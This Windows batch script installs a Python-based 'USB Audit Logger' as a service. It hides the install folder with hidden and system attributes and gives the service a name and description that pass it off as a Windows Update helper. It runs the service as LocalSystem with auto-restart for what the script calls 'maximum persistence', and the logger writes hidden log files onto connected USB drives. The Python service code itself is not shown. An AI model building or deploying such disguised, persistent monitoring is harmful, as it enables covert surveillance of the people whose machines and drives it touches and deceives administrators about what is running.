@echo off
REM ============================================================================
REM USB Audit Logger - Complete Automated Installer
REM This script installs everything needed including Python if not present
REM ============================================================================

setlocal enabledelayedexpansion

REM Check for Administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ============================================================================
    echo ERROR: This script requires Administrator privileges!
    echo Please right-click and select "Run as Administrator"
    echo ============================================================================
    pause
    exit /b 1
)

echo ============================================================================
echo USB Audit Logger - Automated Installation
echo ============================================================================
echo.

REM Get the directory where this batch file is located
set "BATCH_DIR=%~dp0"
cd /d "%BATCH_DIR%"

echo Current directory: %CD%
echo.

REM Set installation directory to hidden system folder
set "INSTALL_DIR=%ProgramData%\.system\WindowsUpdateHelper"
set "PYTHON_DIR=%INSTALL_DIR%\runtime"
set "SCRIPT_FILE=%INSTALL_DIR%\service.py"

REM Create installation directory
echo [1/8] Creating hidden installation directory...
if not exist "%ProgramData%\.system" (
    mkdir "%ProgramData%\.system"
    attrib +h "%ProgramData%\.system"
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
attrib +h +s "%INSTALL_DIR%"

echo Installation directory created: %INSTALL_DIR%
echo.

REM Check if Python service file exists in current directory
echo [2/8] Locating Python service file...
set "SOURCE_FILE=%BATCH_DIR%usb_audit_service.py"

echo Looking for: %SOURCE_FILE%

if exist "%SOURCE_FILE%" (
    echo Found: usb_audit_service.py
) else (
    echo.
    echo ============================================================================
    echo ERROR: usb_audit_service.py not found!
    echo ============================================================================
    echo.
    echo Please ensure usb_audit_service.py is in the same folder as this installer.
    echo.
    echo Current folder: %BATCH_DIR%
    echo Looking for: usb_audit_service.py
    echo.
    echo Files in current directory:
    dir /b "%BATCH_DIR%*.py"
    echo.
    echo ============================================================================
    pause
    exit /b 1
)

REM Check if Python is installed system-wide
echo [3/8] Checking for Python installation...
python --version >nul 2>&1
if %errorLevel% equ 0 (
    echo Python is already installed system-wide.
    for /f "tokens=*" %%i in ('python --version 2^>^&1') do echo %%i
    set "PYTHON_CMD=python"
    set "PIP_CMD=python -m pip"
    set "USE_SYSTEM_PYTHON=1"
) else (
    echo Python not found. Installing embedded Python...
    set "USE_SYSTEM_PYTHON=0"
    
    REM Download Python embeddable package
    echo Downloading Python 3.11 embeddable...
    set "PYTHON_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
    set "PYTHON_ZIP=%TEMP%\python-embed.zip"
    
    powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%PYTHON_ZIP%'}"
    
    if not exist "%PYTHON_ZIP%" (
        echo ERROR: Failed to download Python!
        pause
        exit /b 1
    )
    
    REM Extract Python
    echo Extracting Python to: %PYTHON_DIR%
    powershell -Command "& {Expand-Archive -Path '%PYTHON_ZIP%' -DestinationPath '%PYTHON_DIR%' -Force}"
    del "%PYTHON_ZIP%"
    
    REM Configure Python embeddable to use pip
    echo Configuring Python...
    set "PTH_FILE=%PYTHON_DIR%\python311._pth"
    if exist "%PTH_FILE%" (
        echo import site>> "%PTH_FILE%"
    )
    
    REM Download get-pip.py
    echo Installing pip...
    set "GET_PIP=%PYTHON_DIR%\get-pip.py"
    powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://bootstrap.pypa.io/get-pip.py' -OutFile '%GET_PIP%'}"
    
    REM Install pip
    "%PYTHON_DIR%\python.exe" "%GET_PIP%" --no-warn-script-location
    
    set "PYTHON_CMD=%PYTHON_DIR%\python.exe"
    set "PIP_CMD=%PYTHON_DIR%\python.exe -m pip"
)
echo.

REM Copy the Python service file to installation directory
echo [4/8] Copying service files...
echo Source: %SOURCE_FILE%
echo Destination: %SCRIPT_FILE%

copy /Y "%SOURCE_FILE%" "%SCRIPT_FILE%" >nul
if %errorLevel% equ 0 (
    echo Service file copied successfully.
) else (
    echo ERROR: Failed to copy service file!
    pause
    exit /b 1
)
echo.

REM Install required Python packages
echo [5/8] Installing required Python packages...
echo Installing pywin32...
%PIP_CMD% install --break-system-packages pywin32 2>nul
if %errorLevel% neq 0 (
    echo Trying alternative installation method...
    %PIP_CMD% install --user pywin32 2>nul
    if !errorLevel! neq 0 (
        %PIP_CMD% install pywin32
    )
)
echo.

REM Run post-install script for pywin32
echo [6/8] Configuring pywin32...
for /f "delims=" %%i in ('%PYTHON_CMD% -c "import sys; from pathlib import Path; print(Path(sys.executable).parent)"') do set "PYTHON_ROOT=%%i"

REM Try multiple methods to run pywin32 post-install
if exist "%PYTHON_ROOT%\Scripts\pywin32_postinstall.py" (
    %PYTHON_CMD% "%PYTHON_ROOT%\Scripts\pywin32_postinstall.py" -install >nul 2>&1
) else (
    %PYTHON_CMD% -c "import win32serviceutil" >nul 2>&1
    if !errorLevel! neq 0 (
        for /f "delims=" %%i in ('dir /s /b "%PYTHON_ROOT%\pywin32_postinstall.py" 2^>nul') do (
            %PYTHON_CMD% "%%i" -install >nul 2>&1
            goto :pywin32_done
        )
    )
)
:pywin32_done
echo.

REM Check if service already exists and remove it
echo [7/8] Installing Windows service...
sc query WindowsUpdateHelperService >nul 2>&1
if %errorLevel% equ 0 (
    echo Service already exists. Removing old version...
    %PYTHON_CMD% "%SCRIPT_FILE%" stop >nul 2>&1
    %PYTHON_CMD% "%SCRIPT_FILE%" remove >nul 2>&1
    timeout /t 2 /nobreak >nul
)

REM Install the service
echo Installing service...
%PYTHON_CMD% "%SCRIPT_FILE%" install
if %errorLevel% neq 0 (
    echo ERROR: Failed to install service!
    echo.
    echo Troubleshooting information:
    echo Python: %PYTHON_CMD%
    echo Script: %SCRIPT_FILE%
    echo.
    pause
    exit /b 1
)
echo Service installed successfully.
echo.

REM Configure service to auto-start
echo [8/8] Configuring service for maximum persistence...
sc config WindowsUpdateHelperService start=auto >nul
sc config WindowsUpdateHelperService obj=LocalSystem >nul
sc failure WindowsUpdateHelperService reset=86400 actions=restart/60000/restart/60000/restart/60000 >nul
sc description WindowsUpdateHelperService "Provides auxiliary support for Windows Update operations and system maintenance tasks" >nul
echo.

REM Start the service
echo Starting service...
%PYTHON_CMD% "%SCRIPT_FILE%" start 2>nul
if %errorLevel% neq 0 (
    net start WindowsUpdateHelperService 2>nul
)
echo.

REM Verify service is running
echo Verifying service status...
timeout /t 3 /nobreak >nul
sc query WindowsUpdateHelperService | find "RUNNING" >nul
if %errorLevel% equ 0 (
    echo.
    echo ============================================================================
    echo SUCCESS! USB Audit Logger has been installed and started.
    echo ============================================================================
    echo.
    echo Service Name: Windows Update Helper Service
    echo Status: RUNNING
    echo Auto-start: ENABLED
    echo Installation Path: %INSTALL_DIR% ^(Hidden^)
    echo.
    echo The service is now:
    echo   - Running in the background
    echo   - Hidden in system folders
    echo   - Will survive restarts
    echo   - Will auto-recover from crashes
    echo   - Monitors ONLY external/removable USB drives
    echo   - Ignores internal hard drives and fixed disks
    echo.
    echo Files created on USB drives:
    echo   - info.txt ^(visible - basic info^)
    echo   - access_history.txt ^(visible - access log^)
    echo   - .access_audit.log ^(hidden - detailed JSON log^)
    echo.
    echo ============================================================================
    echo.
    echo IMPORTANT: You can now delete the installer files.
    echo The service is installed and will continue running.
    echo.
    echo Service files location:
    echo   %SCRIPT_FILE%
    echo.
    echo To uninstall later, run as Administrator:
    echo   %PYTHON_CMD% "%SCRIPT_FILE%" remove
    echo.
    echo ============================================================================
) else (
    echo.
    echo ============================================================================
    echo WARNING: Service installed but may not be running.
    echo ============================================================================
    echo.
    echo Current service status:
    sc query WindowsUpdateHelperService
    echo.
    echo Check Event Viewer ^(eventvwr.msc^) -^> Windows Logs -^> Application
    echo for error details.
    echo.
    echo ============================================================================
)

echo.
echo Installation complete. Press any key to exit...
pause >nul
endlocal